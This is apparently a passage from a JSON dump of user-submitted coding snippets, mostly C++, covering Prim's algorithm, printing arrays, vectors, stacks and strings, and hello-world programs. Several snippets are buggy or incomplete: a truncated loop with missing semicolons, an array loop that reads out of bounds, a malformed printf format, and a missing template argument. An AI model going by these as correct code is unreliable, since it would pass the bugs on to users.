    "description": "#include<stdio.h> #include<conio.h> int a,b,u,v,n,i,j,ne=1; int visited[10]= {\t0},min,mincost=0,cost[10][10]; void main() {\t clrscr();\t printf(\"\\n Enter the number of nodes:\");\t scanf(\"%d\",&n);\t printf(\"\\n Enter the adjacency matrix:\\n\");\t for (i=1;i<=n;i++)\t       for (j=1;j<=n;j++) {\t\t       scanf(\"%d\",&cost[i][j]);\t\t       if(cost[i][j]==0)\t\t           cost[i][j]=999;\t       }\t     visited[1]=1;\t     printf(\"\\n\");\t     while(ne<n) {\t\t       for (i=1,min=999;i<=n;i++)\t\t           for (j=1;j<=n;j++)\t\t               if(cost[i][j]<min)\t\t                if(visited[i]!=0) {\t\t\t           min=cost[i][j];\t\t\t           a=u=i;\t\t\t           b=v=j;\t\t           }\t\t           if(visited[u]==0 || visited[v]==0)            {\t\t\t             printf(\"\\n Edge %d:(%d %d) cost:%d\",ne++,a,b,min);             mincost+=min;\t\t\t             visited[b]=1;\t\t             }\t\t           cost[a][b]=cost[b][a]=999;\t           }\t           printf(\"\\n Minimun cost=%d\",mincost);           getch(); }\ndef empty_graph(n):     res = []     for i in range(n):         res.append([0]*n)     return res def convert(graph):     matrix = []     for i in range(len(graph)):          matrix.append([0]*len(graph))         for j in graph[i]:             matrix[i][j] = 1     return matrix def prims_algo(graph):     graph1 = convert(graph)     n = len(graph1)     tree = empty_graph(n)     con =[0]     while len(con) < n :         found = False         for i in con:             for j in range(n):                 if j not in con and graph1[i][j] == 1:                     tree[i][j] =1                     tree[j][i] =1                     con += [j]                     found  = True                     break             if found :                 break     return tree matrix = [[0, 1, 1, 1, 0, 1, 1, 0, 0],           [1, 0, 0, 1, 0, 0, 1, 1, 0],           [1, 0, 0, 1, 0, 0, 0, 0, 0],           [1, 1, 1, 0, 1, 0, 0, 0, 0],           [0, 0, 0, 1, 0, 1, 0, 0, 1],           [1, 0, 0, 0, 1, 0, 0, 0, 1],           [1, 1, 0, 0, 0, 0, 0, 0, 0],           [0, 1, 0, 0, 0, 0, 0, 0, 0],           [0, 0, 0, 0, 1, 1, 0, 0, 0]]  lst = [[1,2,3,5,6],[0,3,6,7],[0,3],[0,1,2,4],[3,5,8],[0,4,8],[0,1],[1],[4,5]] print(\"From graph to spanning tree:\\n\") print(prims_algo(lst))\n#include <iostream> #include <vector> #include <queue> #include <functional> #include <utility>  using namespace std; const int MAX = 1e4 + 5; typedef pair<long long, int> PII; bool marked[MAX]; vector <PII> adj[MAX];  long long prim(int x) {     priority_queue<PII, vector<PII>, greater<PII> > Q;     int y;     long long minimumCost = 0;     PII p;     Q.push(make_pair(0, x));     while(!Q.empty())     {         // Select the edge with minimum weight         p = Q.top();         Q.pop();         x = p.second;         // Checking for cycle         if(marked[x] == true)             continue;         minimumCost += p.first;         marked[x] = true;         for(int i = 0;i < adj[x].size();++i)         {             y = adj[x][i].second;             if(marked[y] == false)                 Q.push(adj[x][i]);         }     }     return minimumCost; }  int main() {     int nodes, edges, x, y;     long long weight, minimumCost;     cin >> nodes >> edges;     for(int i = 0;i < edges;++i)     {         cin >> x >> y >> weight;         adj[x].push_back(make_pair(weight, y));         adj[y].push_back(make_pair(weight, x));     }     // Selecting 1 as the starting node     minimumCost = prim(1);     cout << minimumCost << endl;     return 0; }\n# Prim's Algorithm in Python  INF = 9999999 # number of vertices in graph N = 5 #creating graph by adjacency matrix method G = [[0, 19, 5, 0, 0],      [19, 0, 5, 9, 2],      [5, 5, 0, 1, 6],      [0, 9, 1, 0, 1],      [0, 2, 6, 1, 0]]  selected_node = [0, 0, 0, 0, 0]  no_edge = 0  selected_node[0] = True  # printing for edge and weight print(\"Edge : Weight\\n\") while (no_edge < N - 1):          minimum = INF     a = 0     b = 0     for m in range(N):         if selected_node[m]:             for n in range(N):                 if ((not selected_node[n]) and G[m][n]):                       # not in selected and there is an edge                     if minimum > G[m][n]:                         minimum = G[m][n]                         a = m                         b = n     print(str(a) + \"-\" + str(b) + \":\" + str(G[a][b]))     selected_node[b] = True     no_edge += 1 \n//Minimum spanning tree using prim's Algorithm brute force method //     BRUTE FORCE APPROACH  #include<bits/stdc++.h> using namespace std; void addedge(vector<pair<int,int>>adj[],int u,int v,int weight) {     adj[u].push_back(make_pair(v,weight));     adj[v].push_back(make_pair(u,weight)); } int main() {     int vertex,edges;     cout<<\"ENTER THE NUMBER OF VERTEX AND EDGES:\"<<endl;     cin>>vertex>>edges;     vector<pair<int,int>>adj[vertex];     int a,b,w;     cout<<\"ENTER THE LINKS:\"<<endl;     for(int i=0;i<edges;i++)     {         cin>>a>>b>>w;         addedge(adj,a,b,w);     }     int parent[vertex],key[vertex];     bool mset[vertex];     for(int i=0;i<vertex;i++)     {         parent[i]=-1;         key[i]=INT_MAX;         mset[i]=false;     }     key[0]=0;     parent[0]=-1;     for(int i=0;i<vertex-1;i++)     {         int minimum=INT_MAX,u;         for(int v=0;v<vertex;v++)         {             if(mset[v]==false&&key[v]<minimum)             {                 minimum=key[v];                 u=v;             }         }         mset[u]=true;         for(auto it:adj[u])         {             int v=it.first;             int weight=it.second;             if(mset[v]==false&&weight<key[v])             {                 parent[v]=u;                 key[v]=weight;             }         }     }     for(int i=1;i<vertex;i++)     {         cout<<parent[i]<<\"->\"<<i<<endl;     }     return 0; } \n// Minimum spanning tree using Prim's Algorithm Efficient Approach //     Using Priority Queue // Watch striver graph series :) #include<bits/stdc++.h> using namespace std; void addedge(vector<pair<int,int>>adj[],int u,int v,int weight) {     adj[u].push_back(make_pair(v,weight));     adj[v].push_back(make_pair(u,weight)); } int main() {     int vertex,edges;     cout<<\"ENTER THE NUMBER OF VERTEX AND EDGES:\"<<endl;     cin>>vertex>>edges;     vector<pair<int,int>>adj[vertex];     int a,b,w;     cout<<\"ENTER THE LINKS:\"<<endl;     for(int i=0;i<edges;i++)     {         cin>>a>>b>>w;         addedge(adj,a,b,w);     }     int parent[vertex],key[vertex];     bool mset[vertex];     for(int i=0;i<vertex;i++)     {         parent[i]=-1;         key[i]=INT_MAX;         mset[i]=false;     }     priority_queue<pair<int,int>,vector<pair<int,int>>,greater<pair<int,int>>>pq;     parent[0]=-1;     key[0]=0;     pq.push(make_pair(0,0));//storing Key[i] and i     for(int count=0;count<vertex-1;count++)     {         int u=pq.top().second;         pq.pop();         mset[u]=true;         for(auto it:adj[u])         {             int v=it.first;             int weight=it.second;             if(mset[v]==false&&weight<key[v])             {                 parent[v]=u;                 pq.push(make_pair(key[v],v));                 key[v]=weight;             }         }     }     for(int i=1;i<vertex;i++)     {         cout<<parent[i]<<\"->\"<<i<<endl;     }     return 0; } \n",
    "reg_date": "2021-10-12T11:42:39.000Z"
  },
  {
    "id": 3341,
    "keyword": null,
    "link": null,
    "title": " prims c++",
    "description": "#include <iostream> #include <vector> #include <queue> #include <functional> #include <utility>  using namespace std; const int MAX = 1e4 + 5; typedef pair<long long, int> PII; bool marked[MAX]; vector <PII> adj[MAX];  long long prim(int x) {     priority_queue<PII, vector<PII>, greater<PII> > Q;     int y;     long long minimumCost = 0;     PII p;     Q.push(make_pair(0, x));     while(!Q.empty())     {         // Select the edge with minimum weight         p = Q.top();         Q.pop();         x = p.second;         // Checking for cycle         if(marked[x] == true)             continue;         minimumCost += p.first;         marked[x] = true;         for(int i = 0;i < adj[x].size();++i)         {             y = adj[x][i].second;             if(marked[y] == false)                 Q.push(adj[x][i]);         }     }     return minimumCost; }  int main() {     int nodes, edges, x, y;     long long weight, minimumCost;     cin >> nodes >> edges;     for(int i = 0;i < edges;++i)     {         cin >> x >> y >> weight;         adj[x].push_back(make_pair(weight, y));         adj[y].push_back(make_pair(weight, x));     }     // Selecting 1 as the starting node     minimumCost = prim(1);     cout << minimumCost << endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:42:39.000Z"
  },
  {
    "id": 3342,
    "keyword": null,
    "link": null,
    "title": " primtiive calculator in c++",
    "description": "#include <iostream> #include <vector> #include <algorithm> #include <stdio.h> #include <stdlib.h>  long long f(long long n, vector <long long> arr) {      arr[1]=0;      arr.push_back(n);     long long ans=0, ret=0;      if (n==1)     {         return (0);     }     ans= f(n-1, arr) + 1;       if (n%2==0)     {         ret= f(n/2, arr) + 1;         if (ret<ans)         {             ans=ret;             std::cout<<ans<<'\\n';         }     }     if (n%3==0)     {          ret= f(n/3, arr) + 1;         if (ret<ans)         {             ans=ret;             std::cout<<ans<<'\\n';         }     }     arr[n]=ans;      return arr[n];     }  int main() {      long long n;     std::cin >> n;     std::vector<long long> arr;     std::cout<<f(n, arr);      return 0; }\n",
    "reg_date": "2021-10-12T11:42:39.000Z"
  },
  {
    "id": 3343,
    "keyword": null,
    "link": null,
    "title": " print 2d array c++",
    "description": "\tfor(int i=0; i<v.size(); i++)  \t\tfor(int j=0; j<v[i].size(); j++)    \t\t\tcout<<v[i][j]<<\" \";         cout<<endl;\nfor( auto &row : arr) {     for(auto col : row)          cout << col << \" \"; \tcout<<endl;  }\n// A recursive function able to print a vector // of an arbitrary amount of dimensions. template<typename T> static void show(T vec) {   std::cout << vec; }   template<typename T> static void show(std::vector<T> vec) {   int size = vec.size();   if (size <= 0) {     std::cout << \"invalid vector\";     return;   }   std::cout << '{';   for (int l = 0; l < size - 1; l++) {     show(vec[l]);     std::cout << ',';   }   show(vec[size - 1]);   std::cout << '}'; }\n",
    "reg_date": "2021-10-12T11:42:39.000Z"
  },
  {
    "id": 3344,
    "keyword": null,
    "link": null,
    "title": " print 2d vector c++",
    "description": "for(auto lst : vec){   for(auto e : lst){   \tcout<<e<<\" \";   }   cout<<endl; }\t\n\tfor(int i=0; i<v.size(); i++)  \t\tfor(int j=0; j<v[i].size(); j++)    \t\t\tcout<<v[i][j]<<\" \";         cout<<endl;\nfor( auto &row : arr) {     for(auto col : row)          cout << col << \" \"; \tcout<<endl;  }\nstd::vector<vector<int>> d; //std::vector<int> d; cout<<\"Enter the N number of ship and port:\"<<endl; cin>>in; cout<<\"\\Enter preference etc..:\\n\"; for(i=0; i<in; i++){  cout<<\"ship\"<<i+1<<\":\"<<' ';     for(j=0; j<in; j++){     cin>>temp;     d.push_back(temp);// I don't know how to push_back here!!     } }\n// A recursive function able to print a vector // of an arbitrary amount of dimensions. template<typename T> static void show(T vec) {   std::cout << vec; }   template<typename T> static void show(std::vector<T> vec) {   int size = vec.size();   if (size <= 0) {     std::cout << \"invalid vector\";     return;   }   std::cout << '{';   for (int l = 0; l < size - 1; l++) {     show(vec[l]);     std::cout << ',';   }   show(vec[size - 1]);   std::cout << '}'; }\n",
    "reg_date": "2021-10-12T11:42:39.000Z"
  },
  {
    "id": 3345,
    "keyword": null,
    "link": null,
    "title": " print  pattern and space in cpp",
    "description": "//WAP to print triangle pattern... LOGIC int num{}, i{1};   cin >> num;   while (i <= num) {     for (int space = 1; space <= (num - i); space++) {  // space       cout << \" \";     }     for (int value = 1; value <= (2 * i - 1); value++) {  // value       cout << value;     }     cout << endl; //next row     i++;   }\n",
    "reg_date": "2021-10-12T11:42:39.000Z"
  },
  {
    "id": 3346,
    "keyword": null,
    "link": null,
    "title": " print a 2d vector in c++",
    "description": "// A recursive function able to print a vector // of an arbitrary amount of dimensions. template<typename T> static void show(T vec) {   std::cout << vec; }   template<typename T> static void show(std::vector<T> vec) {   int size = vec.size();   if (size <= 0) {     std::cout << \"invalid vector\";     return;   }   std::cout << '{';   for (int l = 0; l < size - 1; l++) {     show(vec[l]);     std::cout << ',';   }   show(vec[size - 1]);   std::cout << '}'; }\n",
    "reg_date": "2021-10-12T11:42:39.000Z"
  },
  {
    "id": 3347,
    "keyword": null,
    "link": null,
    "title": " print a 3d vector in c++",
    "description": "// A recursive function able to print a vector // of an arbitrary amount of dimensions. template<typename T> static void show(T vec) {   std::cout << vec; }   template<typename T> static void show(std::vector<T> vec) {   int size = vec.size();   if (size <= 0) {     std::cout << \"invalid vector\";     return;   }   std::cout << '{';   for (int l = 0; l < size - 1; l++) {     show(vec[l]);     std::cout << ',';   }   show(vec[size - 1]);   std::cout << '}'; }\n",
    "reg_date": "2021-10-12T11:42:39.000Z"
  },
  {
    "id": 3348,
    "keyword": null,
    "link": null,
    "title": " print a 4d vector in c++",
    "description": "// A recursive function able to print a vector // of an arbitrary amount of dimensions. template<typename T> static void show(T vec) {   std::cout << vec; }   template<typename T> static void show(std::vector<T> vec) {   int size = vec.size();   if (size <= 0) {     std::cout << \"invalid vector\";     return;   }   std::cout << '{';   for (int l = 0; l < size - 1; l++) {     show(vec[l]);     std::cout << ',';   }   show(vec[size - 1]);   std::cout << '}'; }\n",
    "reg_date": "2021-10-12T11:42:39.000Z"
  },
  {
    "id": 3349,
    "keyword": null,
    "link": null,
    "title": " print a multidimensional vector in c++",
    "description": "// A recursive function able to print a vector // of an arbitrary amount of dimensions. template<typename T> static void show(T vec) {   std::cout << vec; }   template<typename T> static void show(std::vector<T> vec) {   int size = vec.size();   if (size <= 0) {     std::cout << \"invalid vector\";     return;   }   std::cout << '{';   for (int l = 0; l < size - 1; l++) {     show(vec[l]);     std::cout << ',';   }   show(vec[size - 1]);   std::cout << '}'; }\n",
    "reg_date": "2021-10-12T11:42:40.000Z"
  },
  {
    "id": 3350,
    "keyword": null,
    "link": null,
    "title": " print a string after a character in c++",
    "description": "/* This is a simple algorithm implemented using arrays! This can also be used when you're asked to find a replacement to the string.find() method */  #include <iostream> #include <vector> using namespace std;  int main() {     string str;     cout << \"Enter string: \";     cin >> str;      vector<int> indexes; // stores the positions of the character we're searching for in the string     vector<string> result; // stores the returned substrings \t     int count = 0, targetIndex = 0; // count stores the number of times the target character repeats in the string     // targetIndex stores the present index of the character   \tfor (int i = 0; i < str.length(); i++) { //  a raw for loop over the length of the string         if (str[i] == 'i' || str[i] == 'I') { // the character we're searching for is 'I' and 'i'             count++; // if 'i' or 'I' is in the string, increment the count varaible             targetIndex = i; // initialize the targetIndex variable with the index at which the character 'i' or 'I' is found             indexes.push_back(targetIndex); // with every loop/ iteration, keep pushing the indexes back to the array         }     }      string temp = \"\"; // a temperary string used later      for (int j = 0; j < indexes.size(); j++) { // looping over the indexes array         temp = str.substr(indexes[j] + 1, str.length()); // simply implementing the substring method => adding a starting index, and an ending index which is the length of the rest of the substring         result.push_back(temp); // pushing back all the returned substring to the result array     }      for (auto item : result) { // using a range based for loop to print the elements of the array         cout << item << \"\\n\";     }   return 0; // end of the program! }\n",
    "reg_date": "2021-10-12T11:42:40.000Z"
  },
  {
    "id": 3351,
    "keyword": null,
    "link": null,
    "title": " print a string with printf in c++",
    "description": "#include <cstdio>  int main() {     char ch = 'a';     float a = 5.0, b = 3.0;     int x = 10;      printf(\"%.3f / %.3f = %.3f \\n\", a,b,a/b);     printf(\"Setting width %*c \\n\",5,ch);     printf(\"Octal equivalent of %d is %o \\n\",x,x);      return 0; }\n",
    "reg_date": "2021-10-12T11:42:40.000Z"
  },
  {
    "id": 3352,
    "keyword": null,
    "link": null,
    "title": " print all chrchetrs of a string c++",
    "description": "#include <iostream> #include <string>  int main() {   std::string s = \"Hello, World!\";      for (int i = 0; i < s.length(); i++) {     std::cout << s[i] << std::endl;   } }\n",
    "reg_date": "2021-10-12T11:42:40.000Z"
  },
  {
    "id": 3353,
    "keyword": null,
    "link": null,
    "title": " print all file names in directory cpp",
    "description": "#include <string> #include <iostream> #include <filesystem> namespace fs = std::filesystem;  int main() {     std::string path = \"/path/to/directory\";     for (const auto & entry : fs::directory_iterator(path))         std::cout << entry.path() << std::endl; } \n",
    "reg_date": "2021-10-12T11:42:40.000Z"
  },
  {
    "id": 3354,
    "keyword": null,
    "link": null,
    "title": " print all number between a and b in c++",
    "description": "#include <bits/stdc++.h> using namespace std; int main(){ int a,b; cin >> a >> b; for(int i=a;i <=b;i++){     cout << i << \" \"; } } \n#include <iostream> using namespace std;  int main(){ int a,b cin>>a>>b for(int i=a, i<=b\n",
    "reg_date": "2021-10-12T11:42:40.000Z"
  },
  {
    "id": 3355,
    "keyword": null,
    "link": null,
    "title": " print all subsets of a string",
    "description": "#include <iostream>  using namespace std; void solve(string s,string op) {     if(s.size()==0)     {         cout<<op<<endl;         return;     }     string op1=op;     string op2=op;     op2.push_back(s[0]);     s.erase(s.begin()+0);     solve(s,op1);     solve(s,op2); } int main() {     string s;     cin>>s;     string op=\"\";     solve(s,op);     return 0; } \n",
    "reg_date": "2021-10-12T11:42:40.000Z"
  },
  {
    "id": 3356,
    "keyword": null,
    "link": null,
    "title": " print all substrings in c++",
    "description": "void printsubstr(string s, int n){     for(int i=0;i<n;i++){         for(int j=1;j<=n-i;j++){             cout<<s.substr(i,j)<<endl;         }     } }\n",
    "reg_date": "2021-10-12T11:42:40.000Z"
  },
  {
    "id": 3357,
    "keyword": null,
    "link": null,
    "title": " print all unique subsets",
    "description": "#include <iostream> #include <vector> #include <algorithm> using namespace std;   // Function to print the elements of a vector void printVector(vector<int> const &out) {     for (int i: out)         cout << i << \" \";     cout << '\\n'; }   // Recursive function to print all distinct subsets of S // S    --> input set // out  --> vector to store subset // i    --> index of next element in set S to be processed void findPowerSet(int S[], vector<int> &out, int i) {     // if all elements are processed, print the current subset     if (i < 0)     {         printVector(out);         return;     }       // include current element in the current subset and recur     out.push_back(S[i]);     findPowerSet(S, out, i - 1);       // exclude current element in the current subset     out.pop_back(); // backtrack       // remove adjacent duplicate elements     while (S[i] == S[i-1])         i--;       // exclude current element in the current subset and recur     findPowerSet(S, out, i - 1); }   // Program to generate all distinct subsets of given set int main() {     int S[] = { 1, 3, 1 };     int n = sizeof(S) / sizeof(S[0]);       // sort the set     sort(S, S + n);       // create an empty vector to store elements of a subset     vector<int> out;     findPowerSet(S, out, n-1);       return 0; } \n",
    "reg_date": "2021-10-12T11:42:40.000Z"
  },
  {
    "id": 3358,
    "keyword": null,
    "link": null,
    "title": " print an array c++",
    "description": "void printArray(int a[],int n){ \tfor(int i=0;i<n;i++)       cout<<a[i]<<\" \";   \tcout<<endl; }\n#include <iostream> using namespace std;  int main() {     int numbers[5] = {7, 5, 6, 12, 35};      cout << \"The numbers are: \";      //  Printing array elements     // using range based for loop     for (const int &n : numbers) {         cout << n << \"  \";     }       cout << \"\\nThe numbers are: \";      //  Printing array elements     // using traditional for loop     for (int i = 0; i < 5; ++i) {         cout << numbers[i] << \"  \";     }      return 0; }\n#include<iostream>  int main() {  \tint array[8] = {1,2,3,4,5,6,7,8};   \tint i = 0;      \twhile (i <= sizeof(array)/sizeof(int))     {      \tstd::cout << array[i];       \ti++;     } }\nfor (auto i : a){ //C++11 \tcout << i<< \" \"; } \nint x[6];\n",
    "reg_date": "2021-10-12T11:42:40.000Z"
  },
  {
    "id": 3359,
    "keyword": null,
    "link": null,
    "title": " print array c++",
    "description": "void printArray(int a[],int n){ \tfor(int i=0;i<n;i++)       cout<<a[i]<<\" \";   \tcout<<endl; }\n#include <iostream> using namespace std;  int main() {     int numbers[5] = {7, 5, 6, 12, 35};      cout << \"The numbers are: \";      //  Printing array elements     // using range based for loop     for (const int &n : numbers) {         cout << n << \"  \";     }       cout << \"\\nThe numbers are: \";      //  Printing array elements     // using traditional for loop     for (int i = 0; i < 5; ++i) {         cout << numbers[i] << \"  \";     }      return 0; }\n#include<iostream>  int main() {  \tint array[8] = {1,2,3,4,5,6,7,8};   \tint i = 0;      \twhile (i <= sizeof(array)/sizeof(int))     {      \tstd::cout << array[i];       \ti++;     } }\nfor (auto i : a){ //C++11 \tcout << i<< \" \"; } \n",
    "reg_date": "2021-10-12T11:42:41.000Z"
  },
  {
    "id": 3360,
    "keyword": null,
    "link": null,
    "title": " print binary in c",
    "description": "#include <iostream> using namespace std; int main() {    long n, d, r, binary = 0;    n=10;    d = n;    int temp = 1;    while (n!=0) {       r = n%2;       n = n / 2;       binary = binary + r*temp;       temp = temp * 10;    }    printf(\"%ld\", binary);    return 0; }\n",
    "reg_date": "2021-10-12T11:42:41.000Z"
  },
  {
    "id": 3361,
    "keyword": null,
    "link": null,
    "title": " print circular linked list c++",
    "description": "/* Function to traverse a given Circular linked list and print nodes */ void printList(struct Node *first)  {      struct Node *temp = first;          // If linked list is not empty      if (first != NULL)       {          // Keep printing nodes till we reach the first node again          do         {              printf(\"%d \", temp->data);              temp = temp->next;          }          while (temp != first);      }  } \n",
    "reg_date": "2021-10-12T11:42:41.000Z"
  },
  {
    "id": 3362,
    "keyword": null,
    "link": null,
    "title": " print counting in c++",
    "description": "#include<iostream> using namespace std;  int main() {   int n;   cin>>n;   for (int i=1; i<n; i++)   {     cout<<i<<\"\\n\";   }   return 0; }\n#include<iostream> using namespace std;  int main() {   int n;   cin>>n;   for (int i=0; i<n; i++)   {     cout<<i<<\"\\n\";   }   return 0; }\n#include<iostream> using namespace std;  int main() {   int n;   cin>>n;   for (int i=0; i<n; i++)   {     cout<<i<<\"\\n\";   }   return 0; }\n",
    "reg_date": "2021-10-12T11:42:41.000Z"
  },
  {
    "id": 3363,
    "keyword": null,
    "link": null,
    "title": " print data type of a variable in c++",
    "description": "int x = 5; typeid(x).name(); //output: i // i stands for int\n",
    "reg_date": "2021-10-12T11:42:41.000Z"
  },
  {
    "id": 3364,
    "keyword": null,
    "link": null,
    "title": " print elements of linked list",
    "description": "typedef struct node{     int value; //this is the value the node stores     struct node *next; //this is the node the current node points to. this is how the nodes link }node;  void printList(node *head){     node *tmp = head;      while(tmp != NULL){         if(tmp->next == NULL){             printf(\"%d\", tmp->value);         }         else{             printf(\"%d, \", tmp->value);         }         tmp = tmp->next;     } }\nvoid printLinkedList(SinglyLinkedListNode* head) { while(head!=NULL) { cout<<head->data<<endl; head=head->next; } ​ }\n",
    "reg_date": "2021-10-12T11:42:41.000Z"
  },
  {
    "id": 3365,
    "keyword": null,
    "link": null,
    "title": " print half pyramid",
    "description": "#include <bits/stdc++.h> using namespace std;  int main() {     int rows;      cout << \"Enter number of rows: \";     cin >> rows;      for(int i = 1; i <= rows; ++i)     {         for(int j = 1; j <= i; ++j)         {             cout << \"* \";         }         cout << \"\\n\";     }     return 0; }\n",
    "reg_date": "2021-10-12T11:42:41.000Z"
  },
  {
    "id": 3366,
    "keyword": null,
    "link": null,
    "title": " print hello world c++",
    "description": "#include <iostream>   int main(){  std::cout <<\"Hello World\" << std::endl;  return 0; } \n#include<iostream> using namespace std;  int main(){     cout << \"Hello World\" << endl;      return 0; }\n#include <iostream>  using namespace std; main() {   cout << \"Hello world\" << endl;  }\n// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; }\n#include <iostream> // Include standard library and namespace using namespace std; // for c++  int main () // where program starts { \tcout << \"Hello World!\\n\"; // cout (part of std) prints message   \treturn 0; // return int because main is of type int }\n#include <iostream>  using namespace std;  int main() {  cout << \"Hello World\" << endl;\t\t// endl = '\\n'  return 0; }\n",
    "reg_date": "2021-10-12T11:42:41.000Z"
  },
  {
    "id": 3367,
    "keyword": null,
    "link": null,
    "title": " print hello world in c++",
    "description": "#include <iostream>   int main(){  std::cout <<\"Hello World\" << std::endl;  return 0; } \n#include<iostream> using namespace std;  int main(){     cout << \"Hello World\" << endl;      return 0; }\n// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; }\n// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; } \n#include <iostream> // Include standard library and namespace using namespace std; // for c++  int main () // where program starts { \tcout << \"Hello World!\\n\"; // cout (part of std) prints message   \treturn 0; // return int because main is of type int }\n#include <iostream> using std::cout; int main() {      cout<<\"Hello world\";     return 0; } 0 \n",
    "reg_date": "2021-10-12T11:42:41.000Z"
  },
  {
    "id": 3368,
    "keyword": null,
    "link": null,
    "title": " print hello world on c++",
    "description": "/*These are comments. They are used to assist the programmer. They do not affect the program in any way. Write whatever you want*/ #include <iostream> //preprocessor directive (use input/output)  using namespace std; //use standard definitions  //This is the \"main\" function. C++ will start executing code here int main(){ //bracket signals the start of the main function          cout << \"Hello, world!\" << endl; //display with a new line          //main must return an integer. 0 means success, else fail          return 0;  } //end of the main function\n",
    "reg_date": "2021-10-12T11:42:42.000Z"
  },
  {
    "id": 3369,
    "keyword": null,
    "link": null,
    "title": " print in c++",
    "description": "#include <iostream>  int main() {   std::cout << \"Hello, World!\"; // prints 'Hello, World!' to the output.   return 0; }\nstd::cout << \" Something \";\n#include <iostream> using namespace std;  int main(){   cout<<\"Hello World!\"<< endl; // prints \"Hello World\"   return 0; }\nstd::cout << \"\";\n#include <iostream> using namespace std;  int main() {   cout << \"me\";   return 0; } \n#include <iostream> using namespace std;  int main() {   cout << \"ENTER TEXT HERE\";   return 0; } \n",
    "reg_date": "2021-10-12T11:42:42.000Z"
  },
  {
    "id": 3370,
    "keyword": null,
    "link": null,
    "title": " print linebreak python",
    "description": "'\\n'\nprint(\"Hello world\") print(\"          \") print(\"Next line\")\nwrite_stuff = \"content\" + \"\\r\\n\"\t\t# Adds line break to string  file.write(write_stuff)\n",
    "reg_date": "2021-10-12T11:42:42.000Z"
  },
  {
    "id": 3371,
    "keyword": null,
    "link": null,
    "title": " print matrix c++",
    "description": "#include <iostream>  using namespace std;  int matrix[3][3];  int main() {     // asigning values, I suppose this is done allready.      for(int x=0;x<3;x++)     {         for(int y=0;y<3;y++)         {             matrix[x][y]=1;         }     }      // showing the matrix on the screen      for(int x=0;x<3;x++)  // loop 3 times for three lines     {         for(int y=0;y<3;y++)  // loop for the three elements on the line         {             cout<<matrix[x][y];  // display the current element out of the array         }     cout<<endl;  // when the inner loop is done, go to a new line     }     return 0;  // return 0 to the OS. }\n",
    "reg_date": "2021-10-12T11:42:42.000Z"
  },
  {
    "id": 3372,
    "keyword": null,
    "link": null,
    "title": " print number with leading zeros",
    "description": "int n = 123; printf(\"%0.5d\", n); // 00123\n",
    "reg_date": "2021-10-12T11:42:42.000Z"
  },
  {
    "id": 3373,
    "keyword": null,
    "link": null,
    "title": " print numbers after decimal point c++",
    "description": "#include <iostream> #include <iomanip>  int main() {     double d = 122.345;      std::cout << std::fixed;     std::cout << std::setprecision(2);     std::cout << d; }\n1.752222\n",
    "reg_date": "2021-10-12T11:42:42.000Z"
  },
  {
    "id": 3374,
    "keyword": null,
    "link": null,
    "title": " print queue c++",
    "description": "#include <queue> #include <iostream>  void print_queue(std::queue q) {   while (!q.empty())   {     std::cout << q.front() << \" \";     q.pop();   }   std::cout << std::endl; }  int main() {   std::queue<int> q;   for (auto i : {1,2,3,7,4,9,7,2,4}) q.push(i);   print_queue(q); } \n",
    "reg_date": "2021-10-12T11:42:42.000Z"
  },
  {
    "id": 3375,
    "keyword": null,
    "link": null,
    "title": " print reverse number",
    "description": "#include <stdio.h> int main() {     int n, rev = 0, remainder;     printf(\"Enter an integer: \");     scanf(\"%d\", &n);     while (n != 0) {         remainder = n % 10;         rev = rev * 10 + remainder;         n /= 10;     }     printf(\"Reversed number = %d\", rev);     return 0; }  \nvoid printReverse(int n) {   if (n < 1) return;   cout << n << endl;   printReverse(n - 1); }  printReverse(10);  /// 10 9 8 7 6 5 4 3 2 1\n",
    "reg_date": "2021-10-12T11:42:42.000Z"
  },
  {
    "id": 3376,
    "keyword": null,
    "link": null,
    "title": " print space in array cpp",
    "description": "#include <iostream> // cout #include <iomanip> // setw int main() {     int array[10] = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 };            for (auto n : array)     {         std::cout << std::setw(4) << n;     } } \ncout << array << \" \";\nconst int n = 10; int array[n] = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }; for (int i=0;i<n;i++)     printf(\"M\",array[i]); \n",
    "reg_date": "2021-10-12T11:42:42.000Z"
  },
  {
    "id": 3377,
    "keyword": null,
    "link": null,
    "title": " print stack c++",
    "description": "while(!myStack.empty()) { \tcout << myStack.top() << \" \"; \tmyStack.pop(); }\n",
    "reg_date": "2021-10-12T11:42:42.000Z"
  },
  {
    "id": 3378,
    "keyword": null,
    "link": null,
    "title": " print stack from bottom to top",
    "description": "void PrintStack(stack<int> s) {     if (s.empty())         return;     int x = s.top();     s.pop();     PrintStack(s);     cout << x << \" \";     s.push(x); }\n",
    "reg_date": "2021-10-12T11:42:43.000Z"
  },
  {
    "id": 3379,
    "keyword": null,
    "link": null,
    "title": " print stack without pop c++",
    "description": "  for (std::stack<int> dump = stack; !dump.empty(); dump.pop())         std::cout << dump.top() << '\\n'; \n",
    "reg_date": "2021-10-12T11:42:43.000Z"
  },
  {
    "id": 3380,
    "keyword": null,
    "link": null,
    "title": " print string in c++",
    "description": "#include <iostream>  int main() {   std::cout << \"Hello, World!\"; // prints 'Hello, World!' to the output.   return 0; }\n#include <iostream> using namespace std;  int main(){   cout<<\"Hello World!\"<< endl; // prints \"Hello World\"   return 0; }\nstd::cout << \"\";\n#include <iostream> using namespace std;  int main() {   cout << \"me\";   return 0; } \n#include <iostream> using namespace std;  int main() {   cout << \"ENTER TEXT HERE\";   return 0; } \n#include <iostream> #include <string> #include <iterator>  using std::cout; using std::cin; using std::endl; using std::string;  int main(){     string s1 = \"This string will be printed\";     cout << s1;     cout << endl;      printf(\"%s\", s1.c_str());     cout << endl;      return EXIT_SUCCESS; } \n",
    "reg_date": "2021-10-12T11:42:43.000Z"
  },
  {
    "id": 3381,
    "keyword": null,
    "link": null,
    "title": " print text colour C++",
    "description": "#include <stdio.h>    // [0;31m\tRed // [1;31m\tBold Red // [0;32m\tGreen // [1;32m\tBold Green // [0;33m\tYellow // [01;33m\tBold Yellow // [0;34m\tBlue // [1;34m\tBold Blue // [0;35m\tMagenta // [1;35m\tBold Magenta // [0;36m\tCyan // [1;36m\tBold Cyan // [0m\tReset     int main () {   printf(\"\\033[1;31m\");   printf(\"Hello world\\n\");   printf(\"\\033[0m;\")   return 0; } \n",
    "reg_date": "2021-10-12T11:42:43.000Z"
  },
  {
    "id": 3382,
